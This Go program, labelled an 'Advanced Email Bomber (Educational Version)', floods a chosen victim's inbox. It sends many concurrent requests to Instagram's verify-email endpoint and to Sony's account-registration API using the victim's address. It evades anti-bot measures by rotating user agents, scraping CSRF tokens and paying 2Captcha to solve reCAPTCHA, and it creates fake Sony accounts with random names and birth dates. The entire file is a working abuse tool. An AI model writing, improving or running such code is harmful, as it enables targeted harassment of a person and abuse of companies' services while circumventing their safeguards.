package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// --- User-Agent List ---
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
}

// --- Struct Definitions ---
type AttackVector struct {
	Name            string
	TargetURL       string
	RequiresCaptcha bool
	BuildPayload    func(targetEmail, captchaToken string) (io.Reader, string, error)
}

// --- Helper Functions ---
func randString(n int, runes []rune) string {
	s := make([]rune, n)
	for i := range s {
		s[i] = runes[rand.Intn(len(runes))]
	}
	return string(s)
}
func randDOB() string {
	year := rand.Intn(2003-1985) + 1985
	month := rand.Intn(12) + 1
	day := rand.Intn(28) + 1
	return fmt.Sprintf("%04d-%02d-%02d", year, month, day)
}

// --- 2Captcha Section (Complete) ---
const (
	sonySitekey = "6LdWbTcaAAAAADFe7Vs6-1jfzSnprQwDWJ51aRep"
	sonyPageurl = "https://acm.account.sony.com/create_account/personal"
)
func getCaptchaID(client *http.Client, captchaAPIKey string) (string, error) {
	data := url.Values{"key": {captchaAPIKey}, "method": {"userrecaptcha"}, "googlekey": {sonySitekey}, "pageurl": {sonyPageurl}, "json": {"1"}}
	resp, err := client.PostForm("https://2captcha.com/in.php", data)
	if err != nil { return "", err }
	defer resp.Body.Close()
	var result map[string]interface{}
	body, _ := io.ReadAll(resp.Body)
	if err := json.Unmarshal(body, &result); err != nil { return "", err }
	if status, ok := result["status"].(float64); !ok || status != 1 { return "", fmt.Errorf("2captcha service error: %v", result["request"]) }
	return result["request"].(string), nil
}
func pollForCaptchaToken(client *http.Client, captchaAPIKey, captchaID string) (string, error) {
	for i := 0; i < 24; i++ {
		time.Sleep(5 * time.Second)
		reqURL := fmt.Sprintf("https://2captcha.com/res.php?key=%s&action=get&id=%s&json=1", captchaAPIKey, captchaID)
		res, err := client.Get(reqURL)
		if err != nil { continue }
		defer res.Body.Close()
		var poll map[string]interface{}
		body, _ := io.ReadAll(res.Body)
		if err := json.Unmarshal(body, &poll); err != nil { return "", err }
		if status, ok := poll["status"].(float64); ok && status == 1 { return poll["request"].(string), nil }
	}
	return "", fmt.Errorf("captcha not solved in time")
}

// --- Payload Builders ---
func buildSonyPayload(email, captchaToken string) (io.Reader, string, error) {
	password := randString(12, []rune("abcdefghijklmnopqrstuvwxyz")) + "aA1!"
	payload := map[string]interface{}{"email": email, "password": password, "legalCountry": "US", "language": "en-US", "dateOfBirth": randDOB(), "firstName": randString(7, []rune("abcdefghijklmnopqrstuvwxyz")), "lastName": randString(7, []rune("abcdefghijklmnopqrstuvwxyz")), "captchaProvider": "google:recaptcha-invisible", "captchaSiteKey": sonySitekey, "captchaResponse": captchaToken, "clientID": "37351a12-3e6a-4544-87ff-1eaea0846de2", "hashedTosPPVersion": "d3-7b2e7bfa9efbdd9371db8029cb263705"}
	jsonData, err := json.Marshal(payload)
	if err != nil { return nil, "", err }
	return bytes.NewBuffer(jsonData), "application/json", nil
}
func buildInstagramPayload(email, captchaToken string) (io.Reader, string, error) {
	deviceID := fmt.Sprintf("android-%s", randString(16, []rune("0123456789abcdef")))
	data := url.Values{"email": {email}, "device_id": {deviceID}}
	return strings.NewReader(data.Encode()), "application/x-www-form-urlencoded", nil
}

// --- Core Attack Function (with added logging) ---
func runAttack(wg *sync.WaitGroup, client *http.Client, vector AttackVector, targetEmail string, captchaKey string) {
	defer wg.Done()
	log.Printf("[STARTING] Sending request to: %s", vector.Name)
	captchaToken := ""
	var err error
	if vector.RequiresCaptcha {
		if captchaKey == "" { log.Printf("[ERROR] %s requires a 2Captcha API key.", vector.Name); return }
		
		// ADDED LOGS FOR DIAGNOSTICS
		log.Printf("[%s] Getting CAPTCHA ID from 2Captcha...", vector.Name)
		captchaID, err := getCaptchaID(client, captchaKey)
		if err != nil { log.Printf("[ERROR] Could not get CAPTCHA ID for %s: %v", vector.Name, err); return }
		log.Printf("[%s] Successfully got CAPTCHA ID: %s. Now polling for token...", vector.Name, captchaID)
		
		captchaToken, err = pollForCaptchaToken(client, captchaKey, captchaID)
		if err != nil { log.Printf("[ERROR] Could not get CAPTCHA token for %s: %v", vector.Name, err); return }
		log.Printf("[%s] Successfully got CAPTCHA token: %s...", vector.Name, captchaToken[:10]) // Log first 10 chars
	}
	payloadReader, contentType, err := vector.BuildPayload(targetEmail, captchaToken)
	if err != nil { log.Printf("[ERROR] Could not build payload for %s: %v", vector.Name, err); return }
	req, err := http.NewRequest("POST", vector.TargetURL, payloadReader)
	if err != nil { log.Printf("[ERROR] Could not create request for %s: %v", vector.Name, err); return }
	randomUA := userAgents[rand.Intn(len(userAgents))]
	req.Header.Set("User-Agent", randomUA)
	req.Header.Set("Content-Type", contentType)
	if strings.Contains(vector.TargetURL, "instagram.com") {
		var csrfToken string
		instagramURL, _ := url.Parse("https://www.instagram.com")
		for _, cookie := range client.Jar.Cookies(instagramURL) {
			if cookie.Name == "csrftoken" { csrfToken = cookie.Value; break }
		}
		if csrfToken != "" { req.Header.Set("X-Csrftoken", csrfToken); req.Header.Set("X-Ig-App-Id", "936619743392459") }
	}
	resp, err := client.Do(req)
	if err != nil { log.Printf("[FAILURE] Request to %s failed: %v", vector.Name, err); return }
	defer resp.Body.Close()
	if resp.StatusCode >= 200 && resp.StatusCode < 300 { log.Printf("[SUCCESS] Request to %s sent successfully. Status: %d", vector.Name, resp.StatusCode)
	} else { log.Printf("[FAILURE] Request to %s failed with status. Status: %d", vector.Name, resp.StatusCode) }
}

// --- Interactive Prompt ---
func promptForInput(reader *bufio.Reader, prompt string) string {
	fmt.Print(prompt)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

// --- Main Function ---
func main() {
	rand.Seed(time.Now().UnixNano())
	log.Println("--- Advanced Email Bomber (Educational Version) ---")
	reader := bufio.NewReader(os.Stdin)
	targetEmail := promptForInput(reader, "Enter the target email address: ")
	if targetEmail == "" { log.Fatal("Error: Target email cannot be empty.") }
	captchaKey := promptForInput(reader, "Enter your 2captcha.com API key (optional, press Enter to skip): ")
	attacksPerSiteStr := promptForInput(reader, "Enter the number of attacks PER SITE: ")
	attacksPerSite, err := strconv.Atoi(attacksPerSiteStr)
	if err != nil || attacksPerSite <= 0 { log.Fatal("Error: Invalid number of attacks.") }
	attackVectors := []AttackVector{
		{Name: "Instagram - Send Verify Email", TargetURL: "https://www.instagram.com/api/v1/accounts/send_verify_email/", RequiresCaptcha: false, BuildPayload: buildInstagramPayload},
		{Name: "Sony - Create Account", TargetURL: "https://acm.account.sony.com/api/accountInterimRegister", RequiresCaptcha: true, BuildPayload: buildSonyPayload},
	}
	totalAttacks := attacksPerSite * len(attackVectors)
	log.Printf("Target Email: %s | Attacks Per Site: %d | Total Attacks: %d", targetEmail, attacksPerSite, totalAttacks)
	log.Println("Initializing sessions with target sites...")
	var wg sync.WaitGroup
	jar, _ := cookiejar.New(nil)
	tr := &http.Transport{TLSClientConfig: &tls.Config{NextProtos: []string{"http/1.1"}}}
	client := &http.Client{Jar: jar, Timeout: 90 * time.Second, Transport: tr}
	client.Get("https://www.instagram.com/")
	client.Get("https://acm.account.sony.com/create_account/personal")
	log.Println("Sessions initialized. Starting attack...")
	for _, vector := range attackVectors {
		for i := 0; i < attacksPerSite; i++ {
			wg.Add(1)
			go runAttack(&wg, client, vector, targetEmail, captchaKey)
			time.Sleep(50 * time.Millisecond)
		}
	}
	wg.Wait()
	log.Println("--- Operation Finished ---")
}
